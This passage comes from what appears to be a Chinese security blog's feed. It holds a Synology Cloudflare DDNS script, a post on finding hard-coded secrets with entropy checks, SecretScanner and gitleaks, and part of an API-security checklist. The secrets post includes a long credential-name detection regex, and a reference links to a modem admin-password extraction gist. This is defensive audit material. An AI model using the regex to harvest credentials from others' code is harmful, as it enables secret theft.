</p><h2 id="ddns"><a href="#ddns" class="headerlink" title="ddns"></a>ddns</h2><p>ddns这块可以有很多种方法，基本原理相同，通过获取公网IP地址，通过dns服务商接口修改域名解析的ip，个人写的python脚本，shell脚本，或者其他同学写的插件，这里推荐使用luci-app-ddns-go这个插件，主要是比较方便，直接可以从openwrt的软件源进行安装，也可以自行编译安装，说明文档也比较详细，个人比较推荐。</p><p>群晖cloudflare的脚本需要进行修改，具体可以参考，joshuaavalon的脚本，参考连接在最后，这里发现一个bug，群晖的ddns管理模块有时候无法获取到ipv6地址，这时候就歇菜了，个人直接修改脚本，使用以下命令，直接获取ipv6地址，修改后的脚本如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">set</span> <span class="hljs-literal">-e</span>;<br><br>ipv4Regex=<span class="hljs-string">&quot;((25[0-5]|(2[0-4]|1&#123;0,1&#125;[0-9])&#123;0,1&#125;[0-9])\.)&#123;3,3&#125;(25[0-5]|(2[0-4]|1&#123;0,1&#125;[0-9])&#123;0,1&#125;[0-9])&quot;</span><br><br>proxy=<span class="hljs-string">&quot;false&quot;</span><br><br><span class="hljs-comment"># DSM Config</span><br>username=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>password=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br>hostname=<span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span><br><span class="hljs-comment">#ipAddr=&quot;$4&quot;</span><br><br>ipAddr=<span class="hljs-variable">$</span>(<span class="hljs-built_in">curl</span> <span class="hljs-literal">-s</span> <span class="hljs-literal">-X</span> GET http://ipv6.ip.sb)<br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$ipAddr</span> =~ <span class="hljs-variable">$ipv4Regex</span> ]]; then<br>    recordType=<span class="hljs-string">&quot;A&quot;</span>;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nochg&quot;</span>;<br>        <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span> ;<br><span class="hljs-keyword">else</span><br>    recordType=<span class="hljs-string">&quot;AAAA&quot;</span>;<br>fi<br><br>listDnsApi=<span class="hljs-string">&quot;https://api.cloudflare.com/client/v4/zones/<span class="hljs-variable">$</span>&#123;username&#125;/dns_records?type=<span class="hljs-variable">$</span>&#123;recordType&#125;&amp;name=<span class="hljs-variable">$</span>&#123;hostname&#125;&quot;</span><br>createDnsApi=<span class="hljs-string">&quot;https://api.cloudflare.com/client/v4/zones/<span class="hljs-variable">$</span>&#123;username&#125;/dns_records&quot;</span><br><br>res=<span class="hljs-variable">$</span>(<span class="hljs-built_in">curl</span> <span class="hljs-literal">-s</span> <span class="hljs-literal">-X</span> GET <span class="hljs-string">&quot;<span class="hljs-variable">$listDnsApi</span>&quot;</span> <span class="hljs-literal">-H</span> <span class="hljs-string">&quot;Authorization: Bearer <span class="hljs-variable">$password</span>&quot;</span> <span class="hljs-literal">-H</span> <span class="hljs-string">&quot;Content-Type:application/json&quot;</span>)<br>resSuccess=<span class="hljs-variable">$</span>(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$res</span>&quot;</span> | jq <span class="hljs-literal">-r</span> <span class="hljs-string">&quot;.success&quot;</span>)<br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$resSuccess</span> != <span class="hljs-string">&quot;true&quot;</span> ]]; then<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;badauth&quot;</span>;<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span>;<br>fi<br><br>recordId=<span class="hljs-variable">$</span>(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$res</span>&quot;</span> | jq <span class="hljs-literal">-r</span> <span class="hljs-string">&quot;.result[0].id&quot;</span>)<br>recordIp=<span class="hljs-variable">$</span>(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$res</span>&quot;</span> | jq <span class="hljs-literal">-r</span> <span class="hljs-string">&quot;.result[0].content&quot;</span>)<br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$recordIp</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$ipAddr</span>&quot;</span> ]]; then<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nochg&quot;</span>;<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span>;<br>fi<br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$recordId</span> = <span class="hljs-string">&quot;null&quot;</span> ]]; then<br>    <span class="hljs-comment"># Record not exists</span><br>    res=<span class="hljs-variable">$</span>(<span class="hljs-built_in">curl</span> <span class="hljs-literal">-s</span> <span class="hljs-literal">-X</span> POST <span class="hljs-string">&quot;<span class="hljs-variable">$createDnsApi</span>&quot;</span> <span class="hljs-literal">-H</span> <span class="hljs-string">&quot;Authorization: Bearer <span class="hljs-variable">$password</span>&quot;</span> <span class="hljs-literal">-H</span> <span class="hljs-string">&quot;Content-Type:application/json&quot;</span> <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;&#123;\&quot;</span><span class="hljs-built_in">type</span>\<span class="hljs-string">&quot;:\&quot;</span><span class="hljs-variable">$recordType</span>\<span class="hljs-string">&quot;,\&quot;</span>name\<span class="hljs-string">&quot;:\&quot;</span><span class="hljs-variable">$hostname</span>\<span class="hljs-string">&quot;,\&quot;</span>content\<span class="hljs-string">&quot;:\&quot;</span><span class="hljs-variable">$ipAddr</span>\<span class="hljs-string">&quot;,\&quot;</span>proxied\<span class="hljs-string">&quot;:<span class="hljs-variable">$proxy</span>&#125;&quot;</span>)<br><span class="hljs-keyword">else</span><br>    <span class="hljs-comment"># Record exists</span><br>    updateDnsApi=<span class="hljs-string">&quot;https://api.cloudflare.com/client/v4/zones/<span class="hljs-variable">$</span>&#123;username&#125;/dns_records/<span class="hljs-variable">$</span>&#123;recordId&#125;&quot;</span>;<br>    res=<span class="hljs-variable">$</span>(<span class="hljs-built_in">curl</span> <span class="hljs-literal">-s</span> <span class="hljs-literal">-X</span> PUT <span class="hljs-string">&quot;<span class="hljs-variable">$updateDnsApi</span>&quot;</span> <span class="hljs-literal">-H</span> <span class="hljs-string">&quot;Authorization: Bearer <span class="hljs-variable">$password</span>&quot;</span> <span class="hljs-literal">-H</span> <span class="hljs-string">&quot;Content-Type:application/json&quot;</span> <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;&#123;\&quot;</span><span class="hljs-built_in">type</span>\<span class="hljs-string">&quot;:\&quot;</span><span class="hljs-variable">$recordType</span>\<span class="hljs-string">&quot;,\&quot;</span>name\<span class="hljs-string">&quot;:\&quot;</span><span class="hljs-variable">$hostname</span>\<span class="hljs-string">&quot;,\&quot;</span>content\<span class="hljs-string">&quot;:\&quot;</span><span class="hljs-variable">$ipAddr</span>\<span class="hljs-string">&quot;,\&quot;</span>proxied\<span class="hljs-string">&quot;:<span class="hljs-variable">$proxy</span>&#125;&quot;</span>)<br>fi<br><br>resSuccess=<span class="hljs-variable">$</span>(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$res</span>&quot;</span> | jq <span class="hljs-literal">-r</span> <span class="hljs-string">&quot;.success&quot;</span>)<br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$resSuccess</span> = <span class="hljs-string">&quot;true&quot;</span> ]]; then<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;good&quot;</span>;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;badauth&quot;</span>;<br>fi<br></code></pre></td></tr></table></figure><p>脚本修改了两点，一是禁用了ipv4解析，二是通过ipv6.ip.sb获取nas公网ipv6地址，仅供参考。</p><h2 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h2><ul><li>[] ipv6防火墙配置</li><li>[]</li></ul><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><a href="https://ipw.cn/">https://ipw.cn/</a>【ipv6测试】</li><li><a href="https://test-ipv6.com/">https://test-ipv6.com/</a>【ipv6测试】</li><li><a href="https://gist.github.com/enihsyou/24bdff2d1e19dd332de0493ee491ff04">https://gist.github.com/enihsyou/24bdff2d1e19dd332de0493ee491ff04</a>【获取移动光猫 H2-2 管理员密码 ver.2022-04】</li><li><a href="https://github.com/sirpdboy/luci-app-ddns-go">https://github.com/sirpdboy/luci-app-ddns-go</a>【luci-app-ddns-go】</li><li><a href="https://www.ioiox.com/archives/105.html">https://www.ioiox.com/archives/105.html</a>【群晖cloudflare ddns配置】</li><li><a href="https://raw.githubusercontent.com/joshuaavalon/SynologyCloudflareDDNS/master/cloudflareddns.sh">https://raw.githubusercontent.com/joshuaavalon/SynologyCloudflareDDNS/master/cloudflareddns.sh</a>【cloudfalre ddns 脚本】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>敏捷代码审计之代码硬编码</title>
    <link href="/2022/09/09/2022-09-09-harder-coding-scan/"/>
    <url>/2022/09/09/2022-09-09-harder-coding-scan/</url>
    
    <content type="html"><![CDATA[<p>敏捷代码审计之代码硬编码</p><hr><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>硬编码（英语：Hard Code或Hard Coding）是指在软件编码过程中，将输出或输入的相关参数（例如：路径、输出的形式或格式）直接以常量的方式撰写在源代码中，而非在执行期间由外界指定的设置、资源、资料或格式做出适当回应。一般被认定是种反模式或不完美的实现，因为软件受到输入资料或输出格式的改变就必须修改源代码，对客户而言，改变源代码之外的小设置也许还比较容易。但硬编码的状况也并非完全只有缺陷，因某些封装需要或软件本身的保护措施，有时是必要的手段。除此之外，有时候因应某些特殊的需求，制作出简单的应用程序，应用程序可能只会执行一次或者有限的几次，或者永远只应付某种单一需求。</p><p>所谓硬编码，就是把一个本来应该（可以）写到配置信息中的信息直接在程序代码中写死了。密钥硬编码在代码中，而根据密钥的用途不同，这导致了不同的安全风险，有的导致加密数据被破解，数据不再保密，有的导致和服务器通信的加签被破解，引发各种血案。</p><h2 id="硬编码检测方法"><a href="#硬编码检测方法" class="headerlink" title="硬编码检测方法"></a>硬编码检测方法</h2><p>方法论主要参考：密码密钥硬编码检查，参考链接详见文章末尾。</p><h3 id="鉴别密码密钥方法"><a href="#鉴别密码密钥方法" class="headerlink" title="鉴别密码密钥方法"></a>鉴别密码密钥方法</h3><h4 id="香农熵-Shannon-entropy"><a href="#香农熵-Shannon-entropy" class="headerlink" title="香农熵(Shannon entropy)"></a>香农熵(Shannon entropy)</h4><p>密钥的长度决定了密钥空间(keyspace），通常以位为单位。密钥空间越大，密钥被攻破的难度就越大。<br>密钥是由密钥空间的随机值构成。对于任意一个随机变量 X，它的熵定义如下：</p><p><img src="/img/20220909-01.png" alt="熵定义"><br>变量的不确定性越大，熵也就越大，把它搞清楚所需要的信息量也就越大。</p><ul><li><p>P(x_i)P(xi) : 指的是单个样本变量所属的变量种类的个数占据所有变量个数的比例。同等长度的字符串，通常密钥的熵值更高</p></li><li><p>密钥为避免彩虹攻击，在取值上更加的离散，会尽量采用不重复的字符。就像我们为了增加密码的复杂性，要求长度不小于8，必须包含大小写、特殊字符、以及数字一样的道理。所以密钥的熵值会比一般的文本要高的多。我们就是利用这点来识别字符串是否是密钥。</p></li></ul><h3 id="工具的检查逻辑"><a href="#工具的检查逻辑" class="headerlink" title="工具的检查逻辑"></a>工具的检查逻辑</h3><p>对于密码密钥的硬编码检查可以采用静态分析工具来完成。工具的检查过程通常包含四个过程：输入文件准备、检查、过滤和报告输出。<br><img src="/img/20220909-02.png" alt="工具的检查过程">  </p><h4 id="输入文件转换"><a href="#输入文件转换" class="headerlink" title="输入文件转换"></a>输入文件转换</h4><ul><li><p>输入文件分类<br>  我们需要检查的文本文件进行分类，通常包括以下几种类型：</p><ul><li>程序语言：C、C++、Java、Python、Go、Js等；</li><li>有统一格式的文件：属性文件、yaml、csv、json、xml等；</li><li>文本文件：没有固定格式的文本文件。</li></ul></li></ul><p>分类的目的是为了更好的识别文件中的字符串常量，充分利用字符串常量的上下文关联，以便在分析中最大程度的减少误报。</p><ul><li>输入文件转换<ul><li>程序语言：通过各语言的语法解析器，解析成抽象语法树，提取语法树中的等于字符串的常量，以及对    </li><li>应的变量名；有统一格式的文件：照格式转换成变量名和字符串常量值；</li><li>文本文件：采用token的方式分割成一个个的token，变成一个各的字符串常量。</li></ul></li></ul><h4 id="密码密钥检查"><a href="#密码密钥检查" class="headerlink" title="密码密钥检查"></a>密码密钥检查</h4><p>在我们得到大量的变量名和字符串常量后，主要通过正则表达式匹配的方式完成目标的筛选。我们收集的密钥格式包括国内国外主流平台、SDK等相关系统的密钥配置参数名称，可以根据客户的实际情况手动增加和优化规则，进而提高检测的速度和效率。<br>由于检查密码密钥的种类和类型不同，可以通过配置文件来提高检查能力的可扩展性。</p><p>检查配置选项主要包括以下内容：</p><table><thead><tr><th>信息</th><th>描述</th></tr></thead><tbody><tr><td>检查类型</td><td>可分为：变量名、字符串常量、或两个都检查</td></tr><tr><td>密码密钥的类型</td><td>用于区分不同类型的密码密钥；同时用于告警时区分具体检测到的密码密钥类型</td></tr><tr><td>正则表达式</td><td>主要设定匹配的长度，每个字符的可选类型</td></tr><tr><td>熵值的阈值</td><td>用于精确的识别密码密钥的类型，降低误报</td></tr></tbody></table><p>例如：</p><p>检查硬编码的口令：检查变量名中包含：password、passwd、pwd的变量，且变量等于字符串常量；正则表达式可以设置成为：”.*(password|passwd|pwd)$”。</p><p>检查GitHub的个人凭证：检查字符串常量；这个凭证是以”ghp_”开头的，跟随长度为36的字符串，且每个字符可以为数字和字母；正则表达式可以设置成为：“ghp_[0-9a-zA-Z]{36}”。</p><h4 id="密码密钥过滤"><a href="#密码密钥过滤" class="headerlink" title="密码密钥过滤"></a>密码密钥过滤</h4><p>静态分析能很大程度上减少了人工审核的工作量，但由于检查模式的不确定性，也会带来不少的误报。误报会给用户在审核过程中带来很大的负面情绪，从而不愿继续使用工具。为了进一步降低误报，我们可以通过下面的方式来降低误报：</p><ul><li><p>密码密钥熵值的计算</p><p>  前面讨论过密码密钥的特点，可以通过检测密码密钥的信息熵的方式来降低误报。有些密码密钥设定了最低的阈值，但还是有很多密码密钥并未给出具体的阈值，这个就需要通过经验积累来设定，目前业界也有通过机器学习来完善这个阈值的设定。</p></li><li><p>污点分析</p><p>  在代码中，对于口令的变量的取名上，很多并不会遵守可读性和可维护性来设定变量名，通过前面正则表达式的方式来查找硬编码密码的方式，会造成很多的漏报。这里还可以通过污点分析的方法，来推导出密码是否采用了硬编码。例如检查jdbc连接的密码参数，查看该参数是否为字符串常量。</p></li></ul><h4 id="报告输出"><a href="#报告输出" class="headerlink" title="报告输出"></a>报告输出</h4><p>将经过过滤后的结果，输出告警，给出可能泄露的文件名和变量或可能为密码密钥的常量字符串位置，便于人工的排查。</p><h2 id="硬编码检测实战"><a href="#硬编码检测实战" class="headerlink" title="硬编码检测实战"></a>硬编码检测实战</h2><p>对于审计人员或者安全管理人员并不需要关注密钥检查的算法，通常只需要选用合适的流程，匹配恰当的工具，迅速准确的定位硬编码即可。</p><h3 id="检查的流程"><a href="#检查的流程" class="headerlink" title="检查的流程"></a>检查的流程</h3><p>信息收集：此阶段中，审计人员进行必要的信息收集，包括本次审计要求、稳定版本的源代码。<br>工具审计：确定工具审计的标准和各项配置参数，使用Fortify、gitleaks等工具检测目标源代码，对工具检测的结果进行人工核查，筛选，分析，汇总。<br>人工审计：对客户要求人工审计的重点代码采用人工分析的方法，对源代码中的硬编码进行审计。<br>综合汇总：将工具审计和人工审计的结果进行对比汇总<br>输出报告：此阶段中，审计人员根据测试的结果编写直观的硬编码审计服务报告。<br>源代码硬编码审计要求工作人员有丰富的经验及新颖的思路，同时也是一项比较耗费时间和资源的工作，从效率考虑，一般选择性的抽取部分重要环节的代码进行人工审计。</p><h3 id="开源检查工具"><a href="#开源检查工具" class="headerlink" title="开源检查工具"></a>开源检查工具</h3><h4 id="SecretScanner"><a href="#SecretScanner" class="headerlink" title="SecretScanner"></a>SecretScanner</h4><p>项目地址：<a href="https://github.com/deepfence/SecretScanner">https://github.com/deepfence/SecretScanner</a></p><p>SecretScanner可以扫描主机上的容器镜像或本地目录，主要通过正则匹配，扫描效率较高，不仅支持代码而且支持容器扫描，并将结果输出到JSON文件，其中会包含SecretScanner找到的所有敏感数据的详细信息。<br>SecretScanner方便安全人员在主机上收集敏感数据，如果需要审计特定类型代码或者增加新的硬编码检测点，需要手动修改规则，默认配置文件位于项目中的config.yaml，可以根据实际情况自行修改。<br><img src="/img/20220909-03.png" alt="SecretScanner">  </p><p>不足：规则数量一般</p><h4 id="gitleaks"><a href="#gitleaks" class="headerlink" title="gitleaks"></a>gitleaks</h4><p>Gitleaks为你提供了一种方法来扫描你的git存储库，以查找这些不需要的数据，这些数据应该是私有的，扫描可以自动化，以完全适合CI&#x2F;CD工作流程，以便在密码识别更深入到代码库之前进行识别。<br>gitleaks比较有趣的有以下几点：</p><ul><li>支持私有存储库扫描以及需要基于密钥的身份验证的存储库。</li><li>支持Gitlab批量组织和存储库所有者（用户）存储库扫描，并提取请求扫描以在常见CI工作流中使用。</li><li>支持Pre-Commit，方便研发人员在提交之前进行硬编码检测，防止敏感信息提交。</li><li>支持使用git log命令验证由gitleaks找到的发现</li></ul><p><img src="/img/20220909-04.png" alt="gitleaks">  </p><p>不足：对普通用户友好程度一般，对于pre-commit需要手动配置，并且在大文件扫描效率较低，官方已移除多线程配置参数，使用默认线程数进行扫描，如果在使用过程中感觉缓慢，可自行设定编译。同样规则数量一般，可以根据实际情况添加。</p><h4 id="SASTs"><a href="#SASTs" class="headerlink" title="SASTs"></a>SASTs</h4><p>各种SAST工具都可以检测硬编码，但是受限于使用场景，只能检测较少的硬编码场景，比如password，key等，对于特定的硬编码需要手动增加规则，规则友好性一般。</p><h3 id="硬编码检测规则"><a href="#硬编码检测规则" class="headerlink" title="硬编码检测规则"></a>硬编码检测规则</h3><p>无论gitleaks还是secretScanner，均使用正则匹配相关硬编码，敏感信息，我这里整理出部分敏感信息参数，供大家参考，至于规则，按照要求，自行补充即可，比较简单，这里就不单独描述了</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">regex: &#x27;(?i)((access_key|<span class="hljs-string">access_token</span>|<span class="hljs-string">admin_pass</span>|<span class="hljs-string">admin_user</span>|<span class="hljs-string">algolia_admin_key</span>|<span class="hljs-string">algolia_api_key</span>|<span class="hljs-string">alias_pass</span>|<span class="hljs-string">alicloud_access_key</span>|<span class="hljs-string">amazon_secret_access_key</span>|<span class="hljs-string">amazonaws</span>|<span class="hljs-string">ansible_vault_password</span>|<span class="hljs-string">aos_key</span>|<span class="hljs-string">api_key</span>|<span class="hljs-string">api_key_secret</span>|<span class="hljs-string">api_key_sid</span>|<span class="hljs-string">api_secret</span>|<span class="hljs-string">api.googlemaps AIza</span>|<span class="hljs-string">apidocs</span>|<span class="hljs-string">apikey</span>|<span class="hljs-string">apiSecret</span>|<span class="hljs-string">app_debug</span>|<span class="hljs-string">app_id</span>|<span class="hljs-string">app_key</span>|<span class="hljs-string">app_log_level</span>|<span class="hljs-string">app_secret</span>|<span class="hljs-string">appkey</span>|<span class="hljs-string">appkeysecret</span>|<span class="hljs-string">application_key</span>|<span class="hljs-string">appsecret</span>|<span class="hljs-string">appspot</span>|<span class="hljs-string">auth_token</span>|<span class="hljs-string">authorizationToken</span>|<span class="hljs-string">authsecret</span>|<span class="hljs-string">aws_access</span>|<span class="hljs-string">aws_access_key_id</span>|<span class="hljs-string">aws_bucket</span>|<span class="hljs-string">aws_key</span>|<span class="hljs-string">aws_secret</span>|<span class="hljs-string">aws_secret_key</span>|<span class="hljs-string">aws_token</span>|<span class="hljs-string">AWSSecretKey</span>|<span class="hljs-string">b2_app_key</span>|<span class="hljs-string">bashrc password</span>|<span class="hljs-string">bintray_apikey</span>|<span class="hljs-string">bintray_gpg_password</span>|<span class="hljs-string">bintray_key</span>|<span class="hljs-string">bintraykey</span>|<span class="hljs-string">bluemix_api_key</span>|<span class="hljs-string">bluemix_pass</span>|<span class="hljs-string">browserstack_access_key</span>|<span class="hljs-string">bucket_password</span>|<span class="hljs-string">bucketeer_aws_access_key_id</span>|<span class="hljs-string">bucketeer_aws_secret_access_key</span>|<span class="hljs-string">built_branch_deploy_key</span>|<span class="hljs-string">bx_password</span>|<span class="hljs-string">cache_driver</span>|<span class="hljs-string">cache_s3_secret_key</span>|<span class="hljs-string">cattle_access_key</span>|<span class="hljs-string">cattle_secret_key</span>|<span class="hljs-string">certificate_password</span>|<span class="hljs-string">ci_deploy_password</span>|<span class="hljs-string">client_secret</span>|<span class="hljs-string">client_zpk_secret_key</span>|<span class="hljs-string">clojars_password</span>|<span class="hljs-string">cloud_api_key</span>|<span class="hljs-string">cloud_watch_aws_access_key</span>|<span class="hljs-string">cloudant_password</span>|<span class="hljs-string">cloudflare_api_key</span>|<span class="hljs-string">cloudflare_auth_key</span>|<span class="hljs-string">cloudinary_api_secret</span>|<span class="hljs-string">cloudinary_name</span>|<span class="hljs-string">codecov_token</span>|<span class="hljs-string">config</span>|<span class="hljs-string">conn.login</span>|<span class="hljs-string">connectionstring</span>|<span class="hljs-string">consumer_key</span>|<span class="hljs-string">consumer_secret</span>|<span class="hljs-string">credentials</span>|<span class="hljs-string">cypress_record_key</span>|<span class="hljs-string">database_password</span>|<span class="hljs-string">database_schema_test</span>|<span class="hljs-string">datadog_api_key</span>|<span class="hljs-string">datadog_app_key</span>|<span class="hljs-string">db_password</span>|<span class="hljs-string">db_server</span>|<span class="hljs-string">db_username</span>|<span class="hljs-string">dbpasswd</span>|<span class="hljs-string">dbpassword</span>|<span class="hljs-string">dbuser</span>|<span class="hljs-string">deploy_password</span>|<span class="hljs-string">digitalocean_ssh_key_body</span>|<span class="hljs-string">digitalocean_ssh_key_ids</span>|<span class="hljs-string">docker_hub_password</span>|<span class="hljs-string">docker_key</span>|<span class="hljs-string">docker_pass</span>|<span class="hljs-string">docker_passwd</span>|<span class="hljs-string">docker_password</span>|<span class="hljs-string">dockerhub_password</span>|<span class="hljs-string">dockerhubpassword</span>|<span class="hljs-string">dot-files</span>|<span class="hljs-string">dotfiles</span>|<span class="hljs-string">droplet_travis_password</span>|<span class="hljs-string">dynamoaccesskeyid</span>|<span class="hljs-string">dynamosecretaccesskey</span>|<span class="hljs-string">elastica_host</span>|<span class="hljs-string">elastica_port</span>|<span class="hljs-string">elasticsearch_password</span>|<span class="hljs-string">encryption_key</span>|<span class="hljs-string">encryption_password</span>|<span class="hljs-string">env.heroku_api_key</span>|<span class="hljs-string">env.sonatype_password</span>|<span class="hljs-string">eureka.awssecretkey)[a-z0-9_ .\-,]&#123;0,25&#125;)(=</span>|<span class="hljs-string">&gt;</span>|<span class="hljs-string">:=</span>|<span class="hljs-string">\</span>|<span class="hljs-string">\</span>|<span class="hljs-string">:</span>|<span class="hljs-string">&lt;=</span>|<span class="hljs-string">=&gt;</span>|<span class="hljs-string">:).&#123;0,5&#125;[\&quot;]([0-9a-zA-Z\-_=]&#123;8,64&#125;)[\&quot;]&#x27; </span><br></code></pre></td></tr></table></figure><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><a href="https://developer.huawei.com/consumer/cn/forum/topic/0204931065040020698?fid=0101592429757310384">https://developer.huawei.com/consumer/cn/forum/topic/0204931065040020698?fid=0101592429757310384</a>【密码密钥硬编码检查】</li><li><a href="https://github.com/deepfence/SecretScanner">https://github.com/deepfence/SecretScanner</a>【SecretScanner】</li><li><a href="https://github.com/zricethezav/gitleaks">https://github.com/zricethezav/gitleaks</a>【gitleaks】</li><li><a href="https://wooyun.js.org/drops/Android%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E4%B9%8B%E6%B5%85%E8%B0%88%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81.html">https://wooyun.js.org/drops/Android%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E4%B9%8B%E6%B5%85%E8%B0%88%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81.html</a>【浅谈密钥硬编码】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Code Audit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SALT API安全最佳实践</title>
    <link href="/2022/09/08/2022-09-08-salt-api-security-best-practices/"/>
    <url>/2022/09/08/2022-09-08-salt-api-security-best-practices/</url>
    
    <content type="html"><![CDATA[<p>SALT API安全最佳实践</p><hr><p>在多数情况下，专门部署的API安全工具可以更容易、更自动化解决API安全问题。此类平台在整个API生命周期中支持一系列功能，并为组织的API业务逻辑提供必要的上下文以阻止攻击和数据暴露。</p><p>这份API安全最佳实践将帮助企业弥补API安全策略中的差距，以下是关于如何确定问题范围和活动优先顺序的一些建议：</p><ul><li>测试API安全性同时，还需要API运行时捕获未经过标准构建更改的API和测试工具不能发现的API。</li><li>确保覆盖所有环境和软件供应链，而不仅仅是由API网关或API管理平台管理的API。</li><li>如果您不采取API防护措施，可以将重点放在API运行时防护上，将其作为“止血”措施、减缓攻击者的速度并为应用程序和API团队争取时间的一种方式。</li></ul><p>以下内容翻译来至：SaltSecurity Checklist-API_Security_Best_Practices，部分内容掺杂博主本人的观点和看法，如果有问题或者建议，请及时联系本人，鄙人将不胜感激。</p><h2 id="1、API安全设计与开发"><a href="#1、API安全设计与开发" class="headerlink" title="1、API安全设计与开发"></a>1、API安全设计与开发</h2><p>不需要在安全需求上重新创造轮子，可以参考OWASP应用程序安全验证标准(ASVS)，也可以参考安全开发厂商的安全需求自动化推导相关系统，对所有类型的应用程序设计都有用，确保可以进行API集成，并简化API的威胁建模。</p><ul><li>制定开发和集成API安全方案</li><li>在设计评审时增加业务逻辑审查</li><li>制定符合当前开发现状的API编码指南和配置基线</li></ul><h2 id="2、API文档"><a href="#2、API文档" class="headerlink" title="2、API文档"></a>2、API文档</h2><p>不需要在安全需求上重新创造轮子，可以参考OWASP应用程序安全验证标准(ASVS)，也可以参考安全开发厂商的安全需求自动化推导相关系统。充分的文档还为一系列活动提供了好处，包括设计审查、安全测试、安全运维和保护。</p><ul><li>严格遵循API规范，比如owasp OpenAPI(OAS)</li><li>将API架构重新用于基本测试方法和保护方法</li><li>为API文档差异和API变化制定应急方案</li></ul><h2 id="3、API-发现和管理"><a href="#3、API-发现和管理" class="headerlink" title="3、API 发现和管理"></a>3、API 发现和管理</h2><p>尽管API文档本身是一种最佳实践，可能不会始终如一地完成。API地址、参数和数据类型的自动发现对所有组织都至关重要。如何创建准确的API清单，以满足公司内部的众多IT需求。</p><ul><li>尽可能发现API，而不仅仅在生产环境下</li><li>包括依赖的API和第三方API</li><li>标记并标识API和微服务</li></ul><h2 id="4、API安全测试"><a href="#4、API安全测试" class="headerlink" title="4、API安全测试"></a>4、API安全测试</h2><p>使用传统的安全测试工具来验证API安全风险，例如众所周知的错误配置或漏洞，但安全人员要意识到这些工具有局限性。没有一个扫描器擅长解析业务逻辑。API地址、参数和数据类型的自动发现对所有组织都至关重要。这一部分重点介绍如何创建准确的API清单，以满足公司内部的众多IT需求。</p><ul><li>静态分析 API 代码，作为版本控制和 CI&#x2F;CD 的一部分</li><li>检查 API 代码中已知的易受攻击的依赖组件</li><li>动态分析和模糊测试部署的API</li></ul><h2 id="5、前端安全"><a href="#5、前端安全" class="headerlink" title="5、前端安全"></a>5、前端安全</h2><p>保护前端应用程序或API客户端(它们依赖于后端API来提供功能和数据)可以作为分层安全方法的一部分。这部分包括一些用于保护前端的关键元素，但是要注意客户端设计的缺陷。如客户端行为分析和设备标识不经意间造成隐私问题。</p><ul><li>制定前端安全要求，包括JavaScript,Android,iOS</li><li>由于客户端容易被攻击和逆向分析，在客户端尽可能存储少量数据或者不存储数据</li><li>如果后端API已经加固，可以尝试客户端加固</li><li>由于监管要求，对于敏感数据需要进行处理和脱敏</li></ul><h2 id="6、日志和监控"><a href="#6、日志和监控" class="headerlink" 